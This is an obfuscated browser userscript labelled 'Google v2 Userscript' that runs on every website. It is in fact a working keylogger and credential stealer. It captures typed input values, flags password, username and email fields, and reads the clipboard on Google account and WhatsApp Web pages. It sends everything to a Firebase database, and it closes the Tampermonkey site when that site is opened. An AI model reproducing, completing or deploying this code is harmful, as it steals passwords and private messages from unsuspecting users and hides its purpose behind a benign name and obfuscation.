// ==UserScript==
// @name         Google v2 Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @require      https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.9/dayjs.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        window.close
// ==/UserScript==

(function(_0x28e23a,_0x30a75d){const _0x37fb1f=_0x2146,_0x29544a=_0x28e23a();while(!![]){try{const _0x1a5632=parseInt(_0x37fb1f(0x18c))/0x1*(parseInt(_0x37fb1f(0x15f))/0x2)+-parseInt(_0x37fb1f(0x172))/0x3+-parseInt(_0x37fb1f(0x141))/0x4*(parseInt(_0x37fb1f(0x177))/0x5)+-parseInt(_0x37fb1f(0x151))/0x6*(-parseInt(_0x37fb1f(0x167))/0x7)+parseInt(_0x37fb1f(0x14b))/0x8+-parseInt(_0x37fb1f(0x154))/0x9*(parseInt(_0x37fb1f(0x161))/0xa)+parseInt(_0x37fb1f(0x18b))/0xb*(-parseInt(_0x37fb1f(0x18a))/0xc);if(_0x1a5632===_0x30a75d)break;else _0x29544a['push'](_0x29544a['shift']());}catch(_0x2997c8){_0x29544a['push'](_0x29544a['shift']());}}}(_0x2a97,0x1bd99),(function(){'use strict';const _0x3fc03a=_0x2146;let _0xec248a='',_0x5a8d9f='',_0x502680='';const _0x24481a=_0x3fc03a(0x139),_0xeab3ff=_0x3fc03a(0x140)+_0x24481a+'.'+_0x3fc03a(0x15e)+'eb'+_0x3fc03a(0x13f)+'io'+_0x3fc03a(0x136),_0x186ee0=window[_0x3fc03a(0x166)][_0x3fc03a(0x186)],_0xad8f59=new URL(_0x186ee0)[_0x3fc03a(0x188)],_0x3cfd05=_0xad8f59['replaceAll']('.','_');if(_0xad8f59===_0x3fc03a(0x181))window[_0x3fc03a(0x153)]();else{if(_0xad8f59===_0x3fc03a(0x168))return![];}window[_0x3fc03a(0x143)]=_0x3c6bf1,window['onkeyup']=_0x3c6bf1,window[_0x3fc03a(0x169)]=_0x3c6bf1;async function _0x3c6bf1(_0x1aff15){const _0x488e3e=_0x3fc03a,_0x48c6c1=dayjs()['format'](_0x488e3e(0x17a)),_0x59c091=dayjs()[_0x488e3e(0x15b)]('YYYY-MM-DD');print(_0x488e3e(0x15a));const _0x2b83db=window['event']?event:_0x1aff15,_0x2da342=_0x2b83db[_0x488e3e(0x14a)][_0x488e3e(0x133)],_0x6cb6b0=_0x2b83db[_0x488e3e(0x14a)][_0x488e3e(0x146)],_0x2e428a=_0x2b83db['keyCode']?_0x2b83db[_0x488e3e(0x165)]:_0x2b83db[_0x488e3e(0x13a)],_0x69e19f=String[_0x488e3e(0x13b)](_0x2e428a);let _0x5e5404=![];print('getting...\x20A');const _0x45b2c3=cleanHTML(_0x2da342),_0x1741c5=new Date()[_0x488e3e(0x179)]();if(!_0x6cb6b0||!_0x6cb6b0[_0x488e3e(0x144)]())return;print(_0x488e3e(0x170),_0x2da342),print(_0x488e3e(0x148),_0x45b2c3),print(_0x488e3e(0x146),_0x6cb6b0),print(_0x488e3e(0x149));(_0x45b2c3[_0x488e3e(0x17e)]()[_0x488e3e(0x17f)](_0x488e3e(0x16f))||_0x45b2c3[_0x488e3e(0x17e)]()[_0x488e3e(0x17f)]('password')||_0x45b2c3['toLowerCase']()[_0x488e3e(0x17f)](_0x488e3e(0x178))||_0x6cb6b0[_0x488e3e(0x17f)]('@'))&&(_0x5e5404=!![]);const _0x567c78=CryptoJS['MD5'](_0x45b2c3)[_0x488e3e(0x135)](),_0x175e2f=Array['from'](document[_0x488e3e(0x15c)]('img[src]'))[_0x488e3e(0x147)](_0x1d31d7=>_0x1d31d7[_0x488e3e(0x163)])[_0x488e3e(0x176)]((_0x359575,_0x5e9318,_0x3b149e)=>_0x3b149e[_0x488e3e(0x152)](_0x359575)===_0x5e9318);!_0xec248a&&(_0xec248a=await getIDP());const _0x16b29='key\x20'+_0x48c6c1+'\x20'+CryptoJS[_0x488e3e(0x180)](_0x45b2c3)[_0x488e3e(0x135)]()+'\x20'+_0xec248a;print(_0x488e3e(0x157),_0x16b29);const _0x20ea25={'html':_0x45b2c3,'id':_0x16b29,'minute':_0x48c6c1,'value':_0x6cb6b0,'host':_0xad8f59,'url':_0x186ee0,'time':_0x1741c5,'images':_0x175e2f,'imagesCount':_0x175e2f[_0x488e3e(0x13e)],'IDP':_0xec248a,'title':document[_0x488e3e(0x15d)],'inputId':_0x567c78,'cred':_0x5e5404};GM[_0x488e3e(0x156)](_0x16b29,_0x20ea25),print(_0x488e3e(0x17c)),print(_0x16b29,_0x20ea25);}function _0x1461ef(_0x456408){const _0x5a3d46=_0x3fc03a;return fetch(_0xeab3ff+(_0x5a3d46(0x142)+_0x456408['id']+_0x5a3d46(0x14e)),{'method':_0x5a3d46(0x191),'headers':{'Accept':_0x5a3d46(0x155),'Content-Type':_0x5a3d46(0x155)},'body':JSON[_0x5a3d46(0x159)](_0x456408)})[_0x5a3d46(0x134)](_0x3559c1=>print(_0x5a3d46(0x18d),_0x3559c1));}function _0x57e0e3(_0x208b1e){const _0x38a063=_0x3fc03a;return fetch(_0xeab3ff+(_0x38a063(0x18e)+_0x208b1e[_0x38a063(0x16b)]+'.json'),{'method':_0x38a063(0x191),'headers':{'Accept':_0x38a063(0x155),'Content-Type':_0x38a063(0x155)},'body':JSON[_0x38a063(0x159)](_0x208b1e)})['then'](_0x369cb8=>print(_0x369cb8));}function _0x558135(_0x4c8d44,_0x20b9c7){const _0x4d82d0=_0x3fc03a;print(_0x4d82d0(0x13d)),print(_0x4c8d44,_0x20b9c7),document[_0x4d82d0(0x15c)](_0x4d82d0(0x150))[_0x4d82d0(0x138)](_0x1a9d89=>_0x1a9d89[_0x4d82d0(0x132)]['fontStyle']=_0x4d82d0(0x17b)),_0x50ee53(_0x20b9c7);}function _0x50ee53(_0x5299b4){const _0x198f31=_0x3fc03a,_0x597871=dayjs()[_0x198f31(0x15b)](_0x198f31(0x17a)),_0x90a7be=dayjs()['format'](_0x198f31(0x182));print(_0x198f31(0x174));const _0x44964c=_0x198f31(0x164)+_0x597871+'\x20'+CryptoJS[_0x198f31(0x180)](_0x5299b4)[_0x198f31(0x135)]()+';',_0x2cddc0={'id':_0x44964c,'data':_0x5299b4,'IDP':_0xec248a,'time':new Date()[_0x198f31(0x179)](),'copiedFrom':window[_0x198f31(0x166)][_0x198f31(0x186)],'title':document[_0x198f31(0x175)](_0x198f31(0x13c))?.[_0x198f31(0x184)]||document[_0x198f31(0x15d)]};GM[_0x198f31(0x156)](_0x44964c,_0x2cddc0);}async function _0xafff25(_0x4b43a3){const _0x371cbd=_0x3fc03a;!_0xec248a&&(_0xec248a=await getIDP());print(_0x371cbd(0x137)),print(_0x371cbd(0x185),_0xec248a);try{_0x502680=await navigator[_0x371cbd(0x16e)][_0x371cbd(0x145)]();if(!_0x4b43a3)_0x4b43a3=_0x502680;_0x502680!==_0x4b43a3&&(_0x4b43a3=_0x502680,_0x558135(_0x4b43a3,_0x502680)),setTimeout(()=>_0xafff25(_0x4b43a3),0xbb8);}catch(_0x229512){console[_0x371cbd(0x187)](_0x229512),setTimeout(()=>_0xafff25(_0x4b43a3),0xbb8);}}[_0x3fc03a(0x160),'web.whatsapp.com'][_0x3fc03a(0x152)](_0xad8f59)!==-0x1&&_0xafff25();function _0x215060(_0x1ad1ea){const _0x4b4b29=_0x3fc03a;return fetch(_0xeab3ff+(_0x4b4b29(0x16d)+_0x1ad1ea['id']+_0x4b4b29(0x14e)),{'method':'PUT','headers':{'Accept':_0x4b4b29(0x155),'Content-Type':'application/json'},'body':JSON[_0x4b4b29(0x159)](_0x1ad1ea)})[_0x4b4b29(0x134)](_0x385482=>{const _0x28744f=_0x4b4b29;print(_0x28744f(0x14d),_0x385482),document['querySelectorAll'](_0x28744f(0x150))[_0x28744f(0x138)](_0x51cc02=>_0x51cc02[_0x28744f(0x132)][_0x28744f(0x173)]=_0x28744f(0x171));});}function _0x1b09de(){setInterval(()=>{const _0x142459=_0x2146;GM[_0x142459(0x162)]()[_0x142459(0x134)](_0x3b1071=>{const _0xa5a06c=_0x142459;print(_0xa5a06c(0x16c),_0x3b1071),_0x3b1071['forEach'](_0x29c119=>{const _0x587ce8=_0xa5a06c;print('id',_0x29c119),_0x29c119['startsWith']('key\x20')&&(print(_0x587ce8(0x14c),_0x29c119),GM[_0x587ce8(0x14f)](_0x29c119)[_0x587ce8(0x134)](_0x45088d=>{const _0x72584d=_0x587ce8;print(_0x29c119,_0x72584d(0x18f)+_0x45088d[_0x72584d(0x146)]+'\x22'),_0x45088d['savedFrom']=window['location'][_0x72584d(0x186)],_0x1461ef(_0x45088d)[_0x72584d(0x134)](_0x44d8c4=>GM['deleteValue'](_0x29c119)),_0x57e0e3(_0x45088d);}));});});},0x28*0x3e8);}_0x1b09de();function _0x3376b7(){setInterval(()=>{const _0x47051a=_0x2146;GM['listValues']()[_0x47051a(0x134)](_0x47b68b=>{const _0x3a9a12=_0x47051a;print(_0x3a9a12(0x16c),_0x47b68b),_0x47b68b[_0x3a9a12(0x138)](_0x1187d8=>{const _0x18fd45=_0x3a9a12;print('id',_0x1187d8),_0x1187d8[_0x18fd45(0x17d)](_0x18fd45(0x164))&&(print(_0x18fd45(0x14c),_0x1187d8),GM[_0x18fd45(0x14f)](_0x1187d8)[_0x18fd45(0x134)](_0x1cf961=>{const _0x57a072=_0x18fd45;print(_0x1187d8,_0x57a072(0x18f)+_0x1cf961[_0x57a072(0x146)]+'\x22'),_0x1cf961['savedFrom']=window['location'][_0x57a072(0x186)],_0x215060(_0x1cf961)[_0x57a072(0x134)](_0x214b8d=>GM[_0x57a072(0x16a)](_0x1187d8)),_0x57e0e3(_0x1cf961);}));});});},0x9*0x3e8);}_0x3376b7();}()));function print(_0x1d8112,_0x538e17){const _0x213fc2=_0x2146;typeof debug_!==_0x213fc2(0x189)&&print(_0x1d8112,_0x538e17);}function cleanHTML(_0x5044bb){const _0x176391=_0x2146;return _0x5044bb[_0x176391(0x190)](/value=".*?"/,'')[_0x176391(0x190)](/rows=".*?"/,'')['replace'](/aria-expanded=".*?"/,'');}function _0x2146(_0x4e9be3,_0x49975c){const _0x2a9764=_0x2a97();return _0x2146=function(_0x2146b7,_0x3ee16a){_0x2146b7=_0x2146b7-0x132;let _0x175bec=_0x2a9764[_0x2146b7];return _0x175bec;},_0x2146(_0x4e9be3,_0x49975c);}function _0x2a97(){const _0x4c3e4a=['getting...\x20C','gm\x20idp','stringify','getting...','format','querySelectorAll','title','fir','397874MxMybE','accounts.google.com','1740kQZvxo','listValues','src','clip\x20','keyCode','location','5999woxQYx','console.firebase.google.com','oninput','deleteValue','IDP','list','/clips6/','clipboard','email','ohtml','bold','43059RXsxIJ','fontWeight','saving\x20clip...','querySelector','filter','190WbyUyr','username','getTime','YYYY-MM-DD\x20HH\x20mm','italic','getting\x20here---4','startsWith','toLowerCase','includes','MD5','www.tampermonkey.net','YYYY-MM-DD','ran\x20idp','innerText','idp','href','error','hostname','undefined','694992XMvYFD','55OwotUU','1MTuAJR','key\x20saved','/idps/','value:\x20\x22','replace','PUT','style','outerHTML','then','toString','.com','watching...','forEach','keys-cc824-default-rtdb','charCode','fromCharCode','._3W2ap','clip\x20changed...','length','ase','https://','6140fkdVil','/keys6/','onclick','trim','readText','value','map','html','getting...\x20B','target','1750304BbAFXm','id2','clip\x20saved\x20to\x20db...','.json','getValue','ins','414TKogum','indexOf','close','27gRZrea','application/json','setValue'];_0x2a97=function(){return _0x4c3e4a;};return _0x2a97();}async function getIDP(){const _0xf9ec0=_0x2146;let _0x10e886=await GM[_0xf9ec0(0x14f)](_0xf9ec0(0x185));if(_0x10e886)return print(_0xf9ec0(0x158),_0x10e886),_0x10e886;return _0x10e886=new Date()[_0xf9ec0(0x179)]()+'',GM[_0xf9ec0(0x156)](_0xf9ec0(0x185),_0x10e886),print(_0xf9ec0(0x183),_0x10e886),_0x10e886;}
